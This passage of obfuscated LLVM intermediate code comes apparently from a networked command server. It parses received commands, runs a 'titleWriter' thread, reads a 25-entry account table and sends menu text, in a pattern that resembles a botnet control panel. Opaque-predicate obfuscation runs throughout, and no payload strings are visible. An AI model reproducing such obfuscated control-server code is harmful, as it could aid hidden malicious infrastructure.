; <label>:1604:                                   ; preds = %1596
  %1605 = load i32, i32* %4, align 4
  %1606 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %1607 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %1608 = call i64 @strlen(i8* %1607) #8
  %1609 = call i64 @send(i32 %1605, i8* %1606, i64 %1608, i32 16384)
  %1610 = icmp eq i64 %1609, -1
  br i1 %1610, label %1611, label %1612

; <label>:1611:                                   ; preds = %1604
  br label %4181

; <label>:1612:                                   ; preds = %1604
  %1613 = load i32, i32* @x.17
  %1614 = load i32, i32* @y.18
  %1615 = sub i32 %1613, 1
  %1616 = mul i32 %1613, %1615
  %1617 = urem i32 %1616, 2
  %1618 = icmp eq i32 %1617, 0
  %1619 = icmp slt i32 %1614, 10
  %1620 = or i1 %1618, %1619
  br i1 %1620, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1612
  %1621 = load i32, i32* %4, align 4
  %1622 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %1623 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %1624 = call i64 @strlen(i8* %1623) #8
  %1625 = call i64 @send(i32 %1621, i8* %1622, i64 %1624, i32 16384)
  %1626 = icmp eq i64 %1625, -1
  %1627 = load i32, i32* @x.17
  %1628 = load i32, i32* @y.18
  %1629 = sub i32 %1627, 1
  %1630 = mul i32 %1627, %1629
  %1631 = urem i32 %1630, 2
  %1632 = icmp eq i32 %1631, 0
  %1633 = icmp slt i32 %1628, 10
  %1634 = or i1 %1632, %1633
  br i1 %1634, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br i1 %1626, label %1635, label %1652

; <label>:1635:                                   ; preds = %originalBBpart2192
  %1636 = load i32, i32* @x.17
  %1637 = load i32, i32* @y.18
  %1638 = sub i32 %1636, 1
  %1639 = mul i32 %1636, %1638
  %1640 = urem i32 %1639, 2
  %1641 = icmp eq i32 %1640, 0
  %1642 = icmp slt i32 %1637, 10
  %1643 = or i1 %1641, %1642
  br i1 %1643, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1635
  %1644 = load i32, i32* @x.17
  %1645 = load i32, i32* @y.18
  %1646 = sub i32 %1644, 1
  %1647 = mul i32 %1644, %1646
  %1648 = urem i32 %1647, 2
  %1649 = icmp eq i32 %1648, 0
  %1650 = icmp slt i32 %1645, 10
  %1651 = or i1 %1649, %1650
  br i1 %1651, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br label %4181

; <label>:1652:                                   ; preds = %originalBBpart2192
  %1653 = load i32, i32* @x.17
  %1654 = load i32, i32* @y.18
  %1655 = sub i32 %1653, 1
  %1656 = mul i32 %1653, %1655
  %1657 = urem i32 %1656, 2
  %1658 = icmp eq i32 %1657, 0
  %1659 = icmp slt i32 %1654, 10
  %1660 = or i1 %1658, %1659
  br i1 %1660, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1652
  %1661 = load i32, i32* %4, align 4
  %1662 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %1663 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %1664 = call i64 @strlen(i8* %1663) #8
  %1665 = call i64 @send(i32 %1661, i8* %1662, i64 %1664, i32 16384)
  %1666 = icmp eq i64 %1665, -1
  %1667 = load i32, i32* @x.17
  %1668 = load i32, i32* @y.18
  %1669 = sub i32 %1667, 1
  %1670 = mul i32 %1667, %1669
  %1671 = urem i32 %1670, 2
  %1672 = icmp eq i32 %1671, 0
  %1673 = icmp slt i32 %1668, 10
  %1674 = or i1 %1672, %1673
  br i1 %1674, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %1666, label %1675, label %1676

; <label>:1675:                                   ; preds = %originalBBpart2200
  br label %4181

; <label>:1676:                                   ; preds = %originalBBpart2200
  %1677 = load i8*, i8** %3, align 8
  %1678 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1677) #7
  br label %1679

; <label>:1679:                                   ; preds = %1676
  %1680 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1681 = load i32, i32* %5, align 4
  %1682 = sext i32 %1681 to i64
  %1683 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1682
  %1684 = getelementptr inbounds %struct.account, %struct.account* %1683, i32 0, i32 0
  %1685 = getelementptr inbounds [20 x i8], [20 x i8]* %1684, i32 0, i32 0
  %1686 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1687 = call i32 (i8*, i8*, ...) @sprintf(i8* %1680, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1685, i8* %1686) #7
  %1688 = load i32, i32* %4, align 4
  %1689 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1690 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1691 = call i64 @strlen(i8* %1690) #8
  %1692 = call i64 @send(i32 %1688, i8* %1689, i64 %1691, i32 16384)
  %1693 = icmp eq i64 %1692, -1
  br i1 %1693, label %1694, label %1695

; <label>:1694:                                   ; preds = %1679
  br label %4181

; <label>:1695:                                   ; preds = %1679
  br label %1696

; <label>:1696:                                   ; preds = %1695
  br label %561

; <label>:1697:                                   ; preds = %1392
  %1698 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1699 = call i8* @strstr(i8* %1698, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.81, i32 0, i32 0)) #8
  %1700 = icmp ne i8* %1699, null
  br i1 %1700, label %1765, label %1701

; <label>:1701:                                   ; preds = %1697
  %1702 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1703 = call i8* @strstr(i8* %1702, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.82, i32 0, i32 0)) #8
  %1704 = icmp ne i8* %1703, null
  br i1 %1704, label %1765, label %1705

; <label>:1705:                                   ; preds = %1701
  %1706 = load i32, i32* @x.17
  %1707 = load i32, i32* @y.18
  %1708 = sub i32 %1706, 1
  %1709 = mul i32 %1706, %1708
  %1710 = urem i32 %1709, 2
  %1711 = icmp eq i32 %1710, 0
  %1712 = icmp slt i32 %1707, 10
  %1713 = or i1 %1711, %1712
  br i1 %1713, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1705
  %1714 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1715 = call i8* @strstr(i8* %1714, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.83, i32 0, i32 0)) #8
  %1716 = icmp ne i8* %1715, null
  %1717 = load i32, i32* @x.17
  %1718 = load i32, i32* @y.18
  %1719 = sub i32 %1717, 1
  %1720 = mul i32 %1717, %1719
  %1721 = urem i32 %1720, 2
  %1722 = icmp eq i32 %1721, 0
  %1723 = icmp slt i32 %1718, 10
  %1724 = or i1 %1722, %1723
  br i1 %1724, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br i1 %1716, label %1765, label %1725

; <label>:1725:                                   ; preds = %originalBBpart2204
  %1726 = load i32, i32* @x.17
  %1727 = load i32, i32* @y.18
  %1728 = sub i32 %1726, 1
  %1729 = mul i32 %1726, %1728
  %1730 = urem i32 %1729, 2
  %1731 = icmp eq i32 %1730, 0
  %1732 = icmp slt i32 %1727, 10
  %1733 = or i1 %1731, %1732
  br i1 %1733, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1725
  %1734 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1735 = call i8* @strstr(i8* %1734, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0)) #8
  %1736 = icmp ne i8* %1735, null
  %1737 = load i32, i32* @x.17
  %1738 = load i32, i32* @y.18
  %1739 = sub i32 %1737, 1
  %1740 = mul i32 %1737, %1739
  %1741 = urem i32 %1740, 2
  %1742 = icmp eq i32 %1741, 0
  %1743 = icmp slt i32 %1738, 10
  %1744 = or i1 %1742, %1743
  br i1 %1744, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br i1 %1736, label %1765, label %1745

; <label>:1745:                                   ; preds = %originalBBpart2208
  %1746 = load i32, i32* @x.17
  %1747 = load i32, i32* @y.18
  %1748 = sub i32 %1746, 1
  %1749 = mul i32 %1746, %1748
  %1750 = urem i32 %1749, 2
  %1751 = icmp eq i32 %1750, 0
  %1752 = icmp slt i32 %1747, 10
  %1753 = or i1 %1751, %1752
  br i1 %1753, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1745
  %1754 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1755 = call i8* @strstr(i8* %1754, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i32 0, i32 0)) #8
  %1756 = icmp ne i8* %1755, null
  %1757 = load i32, i32* @x.17
  %1758 = load i32, i32* @y.18
  %1759 = sub i32 %1757, 1
  %1760 = mul i32 %1757, %1759
  %1761 = urem i32 %1760, 2
  %1762 = icmp eq i32 %1761, 0
  %1763 = icmp slt i32 %1758, 10
  %1764 = or i1 %1762, %1763
  br i1 %1764, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1756, label %1765, label %1870

; <label>:1765:                                   ; preds = %originalBBpart2212, %originalBBpart2208, %originalBBpart2204, %1701, %1697
  %1766 = load i8*, i8** %3, align 8
  %1767 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1766) #7
  %1768 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %1769 = call i32 (i8*, i8*, ...) @sprintf(i8* %1768, i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.86, i32 0, i32 0)) #7
  %1770 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %1771 = call i32 (i8*, i8*, ...) @sprintf(i8* %1770, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1772 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %1773 = call i32 (i8*, i8*, ...) @sprintf(i8* %1772, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.87, i32 0, i32 0)) #7
  %1774 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %1775 = call i32 (i8*, i8*, ...) @sprintf(i8* %1774, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.88, i32 0, i32 0)) #7
  %1776 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %1777 = call i32 (i8*, i8*, ...) @sprintf(i8* %1776, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1778 = load i32, i32* %4, align 4
  %1779 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %1780 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %1781 = call i64 @strlen(i8* %1780) #8
  %1782 = call i64 @send(i32 %1778, i8* %1779, i64 %1781, i32 16384)
  %1783 = icmp eq i64 %1782, -1
  br i1 %1783, label %1784, label %1785

; <label>:1784:                                   ; preds = %1765
  br label %4181

; <label>:1785:                                   ; preds = %1765
  %1786 = load i32, i32* %4, align 4
  %1787 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %1788 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %1789 = call i64 @strlen(i8* %1788) #8
  %1790 = call i64 @send(i32 %1786, i8* %1787, i64 %1789, i32 16384)
  %1791 = icmp eq i64 %1790, -1
  br i1 %1791, label %1792, label %1809

; <label>:1792:                                   ; preds = %1785
  %1793 = load i32, i32* @x.17
  %1794 = load i32, i32* @y.18
  %1795 = sub i32 %1793, 1
  %1796 = mul i32 %1793, %1795
  %1797 = urem i32 %1796, 2
  %1798 = icmp eq i32 %1797, 0
  %1799 = icmp slt i32 %1794, 10
  %1800 = or i1 %1798, %1799
  br i1 %1800, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1792
  %1801 = load i32, i32* @x.17
  %1802 = load i32, i32* @y.18
  %1803 = sub i32 %1801, 1
  %1804 = mul i32 %1801, %1803
  %1805 = urem i32 %1804, 2
  %1806 = icmp eq i32 %1805, 0
  %1807 = icmp slt i32 %1802, 10
  %1808 = or i1 %1806, %1807
  br i1 %1808, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br label %4181

; <label>:1809:                                   ; preds = %1785
  %1810 = load i32, i32* %4, align 4
  %1811 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %1812 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %1813 = call i64 @strlen(i8* %1812) #8
  %1814 = call i64 @send(i32 %1810, i8* %1811, i64 %1813, i32 16384)
  %1815 = icmp eq i64 %1814, -1
  br i1 %1815, label %1816, label %1817

; <label>:1816:                                   ; preds = %1809
  br label %4181

; <label>:1817:                                   ; preds = %1809
  %1818 = load i32, i32* %4, align 4
  %1819 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %1820 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %1821 = call i64 @strlen(i8* %1820) #8
  %1822 = call i64 @send(i32 %1818, i8* %1819, i64 %1821, i32 16384)
  %1823 = icmp eq i64 %1822, -1
  br i1 %1823, label %1824, label %1825

; <label>:1824:                                   ; preds = %1817
  br label %4181

; <label>:1825:                                   ; preds = %1817
  %1826 = load i32, i32* %4, align 4
  %1827 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %1828 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %1829 = call i64 @strlen(i8* %1828) #8
  %1830 = call i64 @send(i32 %1826, i8* %1827, i64 %1829, i32 16384)
  %1831 = icmp eq i64 %1830, -1
  br i1 %1831, label %1832, label %1849

; <label>:1832:                                   ; preds = %1825
  %1833 = load i32, i32* @x.17
  %1834 = load i32, i32* @y.18
  %1835 = sub i32 %1833, 1
  %1836 = mul i32 %1833, %1835
  %1837 = urem i32 %1836, 2
  %1838 = icmp eq i32 %1837, 0
  %1839 = icmp slt i32 %1834, 10
  %1840 = or i1 %1838, %1839
  br i1 %1840, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1832
  %1841 = load i32, i32* @x.17
  %1842 = load i32, i32* @y.18
  %1843 = sub i32 %1841, 1
  %1844 = mul i32 %1841, %1843
  %1845 = urem i32 %1844, 2
  %1846 = icmp eq i32 %1845, 0
  %1847 = icmp slt i32 %1842, 10
  %1848 = or i1 %1846, %1847
  br i1 %1848, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br label %4181

; <label>:1849:                                   ; preds = %1825
  %1850 = load i8*, i8** %3, align 8
  %1851 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1850) #7
  br label %1852

; <label>:1852:                                   ; preds = %1849
  %1853 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1854 = load i32, i32* %5, align 4
  %1855 = sext i32 %1854 to i64
  %1856 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1855
  %1857 = getelementptr inbounds %struct.account, %struct.account* %1856, i32 0, i32 0
  %1858 = getelementptr inbounds [20 x i8], [20 x i8]* %1857, i32 0, i32 0
  %1859 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1860 = call i32 (i8*, i8*, ...) @sprintf(i8* %1853, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1858, i8* %1859) #7
  %1861 = load i32, i32* %4, align 4
  %1862 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1863 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1864 = call i64 @strlen(i8* %1863) #8
  %1865 = call i64 @send(i32 %1861, i8* %1862, i64 %1864, i32 16384)
  %1866 = icmp eq i64 %1865, -1
  br i1 %1866, label %1867, label %1868

; <label>:1867:                                   ; preds = %1852
  br label %4181

; <label>:1868:                                   ; preds = %1852
  br label %1869

; <label>:1869:                                   ; preds = %1868
  br label %561

; <label>:1870:                                   ; preds = %originalBBpart2212
  %1871 = load i32, i32* @x.17
  %1872 = load i32, i32* @y.18
  %1873 = sub i32 %1871, 1
  %1874 = mul i32 %1871, %1873
  %1875 = urem i32 %1874, 2
  %1876 = icmp eq i32 %1875, 0
  %1877 = icmp slt i32 %1872, 10
  %1878 = or i1 %1876, %1877
  br i1 %1878, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1870
  %1879 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1880 = call i8* @strstr(i8* %1879, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i32 0, i32 0)) #8
  %1881 = icmp ne i8* %1880, null
  %1882 = load i32, i32* @x.17
  %1883 = load i32, i32* @y.18
  %1884 = sub i32 %1882, 1
  %1885 = mul i32 %1882, %1884
  %1886 = urem i32 %1885, 2
  %1887 = icmp eq i32 %1886, 0
  %1888 = icmp slt i32 %1883, 10
  %1889 = or i1 %1887, %1888
  br i1 %1889, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br i1 %1881, label %1930, label %1890

; <label>:1890:                                   ; preds = %originalBBpart2224
  %1891 = load i32, i32* @x.17
  %1892 = load i32, i32* @y.18
  %1893 = sub i32 %1891, 1
  %1894 = mul i32 %1891, %1893
  %1895 = urem i32 %1894, 2
  %1896 = icmp eq i32 %1895, 0
  %1897 = icmp slt i32 %1892, 10
  %1898 = or i1 %1896, %1897
  br i1 %1898, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1890
  %1899 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1900 = call i8* @strstr(i8* %1899, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0)) #8
  %1901 = icmp ne i8* %1900, null
  %1902 = load i32, i32* @x.17
  %1903 = load i32, i32* @y.18
  %1904 = sub i32 %1902, 1
  %1905 = mul i32 %1902, %1904
  %1906 = urem i32 %1905, 2
  %1907 = icmp eq i32 %1906, 0
  %1908 = icmp slt i32 %1903, 10
  %1909 = or i1 %1907, %1908
  br i1 %1909, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br i1 %1901, label %1930, label %1910

; <label>:1910:                                   ; preds = %originalBBpart2228
  %1911 = load i32, i32* @x.17
  %1912 = load i32, i32* @y.18
  %1913 = sub i32 %1911, 1
  %1914 = mul i32 %1911, %1913
  %1915 = urem i32 %1914, 2
  %1916 = icmp eq i32 %1915, 0
  %1917 = icmp slt i32 %1912, 10
  %1918 = or i1 %1916, %1917
  br i1 %1918, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1910
  %1919 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1920 = call i8* @strstr(i8* %1919, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i32 0, i32 0)) #8
  %1921 = icmp ne i8* %1920, null
  %1922 = load i32, i32* @x.17
  %1923 = load i32, i32* @y.18
  %1924 = sub i32 %1922, 1
  %1925 = mul i32 %1922, %1924
  %1926 = urem i32 %1925, 2
  %1927 = icmp eq i32 %1926, 0
  %1928 = icmp slt i32 %1923, 10
  %1929 = or i1 %1927, %1928
  br i1 %1929, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br i1 %1921, label %1930, label %2439

; <label>:1930:                                   ; preds = %originalBBpart2232, %originalBBpart2228, %originalBBpart2224
  %1931 = load i8*, i8** %3, align 8
  %1932 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1931) #7
  %1933 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1934 = call i32 (i8*, i8*, ...) @sprintf(i8* %1933, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i32 0, i32 0)) #7
  %1935 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1936 = call i32 (i8*, i8*, ...) @sprintf(i8* %1935, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1937 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1938 = call i32 (i8*, i8*, ...) @sprintf(i8* %1937, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.93, i32 0, i32 0)) #7
  %1939 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1940 = call i32 (i8*, i8*, ...) @sprintf(i8* %1939, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.94, i32 0, i32 0)) #7
  %1941 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1942 = call i32 (i8*, i8*, ...) @sprintf(i8* %1941, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.95, i32 0, i32 0)) #7
  %1943 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %1944 = call i32 (i8*, i8*, ...) @sprintf(i8* %1943, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.96, i32 0, i32 0)) #7
  %1945 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1946 = call i32 (i8*, i8*, ...) @sprintf(i8* %1945, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.97, i32 0, i32 0)) #7
  %1947 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1948 = call i32 (i8*, i8*, ...) @sprintf(i8* %1947, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.98, i32 0, i32 0)) #7
  %1949 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %1950 = call i32 (i8*, i8*, ...) @sprintf(i8* %1949, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.99, i32 0, i32 0)) #7
  %1951 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1952 = call i32 (i8*, i8*, ...) @sprintf(i8* %1951, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.100, i32 0, i32 0)) #7
  %1953 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1954 = call i32 (i8*, i8*, ...) @sprintf(i8* %1953, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.101, i32 0, i32 0)) #7
  %1955 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1956 = call i32 (i8*, i8*, ...) @sprintf(i8* %1955, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.102, i32 0, i32 0)) #7
  %1957 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1958 = call i32 (i8*, i8*, ...) @sprintf(i8* %1957, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1959 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1960 = call i32 (i8*, i8*, ...) @sprintf(i8* %1959, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.103, i32 0, i32 0)) #7
  %1961 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1962 = call i32 (i8*, i8*, ...) @sprintf(i8* %1961, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.104, i32 0, i32 0)) #7
  %1963 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1964 = call i32 (i8*, i8*, ...) @sprintf(i8* %1963, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.105, i32 0, i32 0)) #7
  %1965 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1966 = call i32 (i8*, i8*, ...) @sprintf(i8* %1965, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.106, i32 0, i32 0)) #7
  %1967 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1968 = call i32 (i8*, i8*, ...) @sprintf(i8* %1967, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.107, i32 0, i32 0)) #7
  %1969 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1970 = call i32 (i8*, i8*, ...) @sprintf(i8* %1969, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.108, i32 0, i32 0)) #7
  %1971 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1972 = call i32 (i8*, i8*, ...) @sprintf(i8* %1971, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.109, i32 0, i32 0)) #7
  %1973 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1974 = call i32 (i8*, i8*, ...) @sprintf(i8* %1973, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.110, i32 0, i32 0)) #7
  %1975 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1976 = call i32 (i8*, i8*, ...) @sprintf(i8* %1975, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.111, i32 0, i32 0)) #7
  %1977 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %1978 = call i32 (i8*, i8*, ...) @sprintf(i8* %1977, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1979 = load i32, i32* %4, align 4
  %1980 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1981 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1982 = call i64 @strlen(i8* %1981) #8
  %1983 = call i64 @send(i32 %1979, i8* %1980, i64 %1982, i32 16384)
  %1984 = icmp eq i64 %1983, -1
  br i1 %1984, label %1985, label %1986

; <label>:1985:                                   ; preds = %1930
  br label %4181

; <label>:1986:                                   ; preds = %1930
  %1987 = load i32, i32* @x.17
  %1988 = load i32, i32* @y.18
  %1989 = sub i32 %1987, 1
  %1990 = mul i32 %1987, %1989
  %1991 = urem i32 %1990, 2
  %1992 = icmp eq i32 %1991, 0
  %1993 = icmp slt i32 %1988, 10
  %1994 = or i1 %1992, %1993
  br i1 %1994, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1986
  %1995 = load i32, i32* %4, align 4
  %1996 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1997 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1998 = call i64 @strlen(i8* %1997) #8
  %1999 = call i64 @send(i32 %1995, i8* %1996, i64 %1998, i32 16384)
  %2000 = icmp eq i64 %1999, -1
  %2001 = load i32, i32* @x.17
  %2002 = load i32, i32* @y.18
  %2003 = sub i32 %2001, 1
  %2004 = mul i32 %2001, %2003
  %2005 = urem i32 %2004, 2
  %2006 = icmp eq i32 %2005, 0
  %2007 = icmp slt i32 %2002, 10
  %2008 = or i1 %2006, %2007
  br i1 %2008, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br i1 %2000, label %2009, label %2026

; <label>:2009:                                   ; preds = %originalBBpart2236
  %2010 = load i32, i32* @x.17
  %2011 = load i32, i32* @y.18
  %2012 = sub i32 %2010, 1
  %2013 = mul i32 %2010, %2012
  %2014 = urem i32 %2013, 2
  %2015 = icmp eq i32 %2014, 0
  %2016 = icmp slt i32 %2011, 10
  %2017 = or i1 %2015, %2016
  br i1 %2017, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %2009
  %2018 = load i32, i32* @x.17
  %2019 = load i32, i32* @y.18
  %2020 = sub i32 %2018, 1
  %2021 = mul i32 %2018, %2020
  %2022 = urem i32 %2021, 2
  %2023 = icmp eq i32 %2022, 0
  %2024 = icmp slt i32 %2019, 10
  %2025 = or i1 %2023, %2024
  br i1 %2025, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br label %4181

; <label>:2026:                                   ; preds = %originalBBpart2236
  %2027 = load i32, i32* %4, align 4
  %2028 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
